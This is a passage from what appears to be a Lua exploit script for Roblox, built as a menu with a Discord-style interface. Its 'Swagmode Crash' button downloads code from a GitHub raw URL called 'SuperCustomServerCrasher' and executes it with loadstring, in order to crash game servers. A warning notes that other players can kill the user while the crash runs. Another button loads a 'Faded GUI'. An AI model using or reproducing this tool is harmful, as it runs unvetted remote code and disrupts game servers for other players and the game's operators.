print("Swagmode Loaded!")

end)

other:Button("Swagmode Crash", function()
print("Executing Swagmode crash..")
loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
wait(0.1)
DiscordLib:Notification("Swagmode Crash", "Swag Crash Loaded (Warning) 1 Crash method requires Good Pc, 2 Crash method requires 100k-200k Dhc and ppl can kill you while Crashing", "Okay I understand!")
print("Swagmode Crash Loaded")
end)

other:Seperator()


other:Label("Faded Stuff")

other:Button("Faded GUI", function()
print("Executing Faded...")
